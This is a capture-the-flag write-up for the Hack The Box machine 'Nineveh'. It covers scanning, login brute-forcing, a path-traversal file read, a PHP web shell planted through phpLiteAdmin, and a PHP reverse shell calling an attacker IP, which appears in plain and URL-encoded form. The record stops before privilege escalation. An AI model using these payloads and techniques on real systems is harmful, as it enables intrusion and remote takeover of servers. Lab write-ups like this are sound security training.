# Nineveh

**Machine ip:** 10.10.10.43

## Enumeration
+ `sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.43 -e tun0 > ports`
+ `ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')`
+ `sudo nmap -Pn -sV -sC -p$ports 10.10.10.43`
+ `sudo nmap -Pn -sV -sC -sU -p$ports 10.10.10.43`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/b0a28bb0-1ce5-4555-b8ea-43c6cb74d925)

+ `nineveh.htb` subdomain discovered.
+ Add: `echo "10.10.10.43 nineveh.htb" >> /etc/hosts`
+ Check for subdomains, and there is nothing.
```
wfuzz -c -u http://10.10.10.43/ -H "Host: FUZZ.nineveh.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hh 178
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/74415df0-f7e4-44e6-bf1c-6f634abeb157)

+ **Firstly**, navigate to `http://nineveh.htb/`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c2011036-a4ab-432c-a4ad-ff243b9dcd85)

+ Directory fuzzing:
```
gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://nineveh.htb/ -x asp,aspx,cgi,htm,html,js,json,jsp,php,pl,py,sh -b 403,404
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/6e68ff8c-ecb5-49c5-9e96-bf3c5facc224)

+ Navigate to `http://nineveh.htb/department/login.php`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ef0dda2e-fd83-4edf-bcce-864d10ac9c29)

+ Page view source. **admin** and **amrois** users discovered on **http://nineveh.htb/department/login.php**

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/2ffc5eeb-eb9f-46a3-a9f2-e1dc57192d63)

+ Brute force using the wordlist: `/usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000.txt`
```
hydra -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64

```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/e7a8f92b-97ca-4876-8cd3-84091385722d)

+ `admin`:`1q2w3e4r5t` credentials discovered on **http://nineveh.htb/department/login.php**


+ **Secondly**, navigate to `https://nineveh.htb/`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/27f0d95d-b1e2-4e72-b56d-b8746e2e7505)

+ Check SSL certificate status: `curl https://nineveh.htb/ -vkI`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/bf1f60d7-c3fd-40ba-81f1-7891c0b4b2f7)

+ `admin` username discovered on **https://nineveh.htb/db/**

+ Directory fuzzing:
```
gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u https://nineveh.htb/ -x php,htm,html -b 403,404 -k
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/34694892-72fd-468e-80f8-28492c074369)

+ Navigate to `https://nineveh.htb/db/`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/7e71e97a-0e14-4f5d-9b7d-65f8b6759cd5)

+ `searchsploit phpliteadmin 1.9`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4c1cf7ee-61d0-4f0e-bab8-46f67b876537)

+ [PHPLiteAdmin 1.9.3 - Remote PHP Code Injection requires authentication](https://www.exploit-db.com/exploits/24044)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d9322e69-d1ee-4397-8419-26f919a5e2a5)

+ Capture the login request on Burp proxy.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/810117ad-cc91-492e-a8a8-bd2c8ee34b80)

+ Send to intruder, and set the payloads.
+ Brute force using the wordlist: `/usr/share/seclists/Passwords/twitter-banned.txt`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/5725fbfc-755a-438c-8500-071ee78463e5)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/55fafbd0-eb21-431a-be79-3db22feed399)

+ `admin` username and `password123` password discovered on **https://nineveh.htb/db/**

## Exploitation
+ Navigate to `http://nineveh.htb/department/login.php`
+ Loging with credentials `admin`:`1q2w3e4r5t`
+ Navigate to `http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt`
+ Check the path whether is vulnerable to LFI.
+ Use the LFI payload: `../../../../../../../etc/passwd`
```
http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt../../../../../../../etc/passwd

http://nineveh.htb/department/manage.php?notes=/ninevehNotes.txt../../../../../../../etc/passwd
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d6c83b59-310c-4bf9-8d2f-94b4d6771a15)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4a8c5328-264a-4fa1-8c3a-bab57c4e932b)

+ Keep going on chain.

+ Okay go back to [PHPLiteAdmin 1.9.3 - Remote PHP Code Injection requires authentication](https://www.exploit-db.com/exploits/24044) on **https://nineveh.htb/db/** again.
+ Login with `password123`
+ Create new database.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a511a89f-9e10-49dd-b1fa-134d3c64f2e9)

+ Create new table and go.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/3bef59a1-f7cd-4e47-91d6-40712f3933b8)

+ Fill out field and default value, then create.
+ `<?php echo system($_REQUEST["cmd"]); ?>` payload for create.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/88cb1f74-3847-45f5-a6e5-e68caaa0a9d0)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/e727b1cf-9c79-4476-95a5-44f07e721400)

+ Navigate to `http://nineveh.htb/department/manage.php?notes=/ninevehNotes.txt../../../../../../../etc/passwd` for /var/tmp/try.php`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/840b2abb-ea07-404a-8182-00ed1357adf5)

+ Change the file and payload:
```
http://nineveh.htb/department/manage.php?notes=/ninevehNotes.txt/../../../../var/tmp/try.php&cmd=id;ls;pwd
```

+ The code executed.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/52b322d4-6962-4189-93e7-e4097102cfb9)

+ Reverse shell payload `php -r '$sock=fsockopen("10.10.14.18",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`
+ [url encoding](https://www.url-encode-decode.com/) the payload:
```
php+-r+%27%24sock%3Dfsockopen%28%2210.10.14.18%22%2C4444%29%3Bexec%28%22%2Fbin%2Fsh+-i+%3C%263+%3E%263+2%3E%263%22%29%3B%27
```

+ Start listener: `nc -lnvp 4444` on your attack machine.
+ Execute command:
```
http://nineveh.htb/department/manage.php?notes=/ninevehNotes.txt/../../../../var/tmp/try.php&cmd=php+-r+%27%24sock%3Dfsockopen%28%2210.10.14.18%22%2C4444%29%3Bexec%28%22%2Fbin%2Fsh+-i+%3C%263+%3E%263+2%3E%263%22%29%3B%27
```

+ Get shell.
+ Stable shell:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
script /dev/null -c bash
CTRL^Z
stty raw -echo; fg
reset
terminal type? xterm
export TERM=xterm  
export SHELL=bash

```
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/bffc80ba-8ed6-4c9a-99d4-8ca0c6533fd1)

+ **www-data** doesn't have read permission: `ls -l /home/amrois/`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ca14a5be-2b4c-4845-a4bf-df1920bf9209)


+ Donwload [LinEnum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh) and transfer it to the target.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/fd7bf5da-cae9-49fe-bf09-f0a1be5f1cb7)






# References & Alternatives:
+ https://vvmlist.github.io/#nineveh
+ https://0xdf.gitlab.io/2020/04/22/htb-nineveh.html
+ 
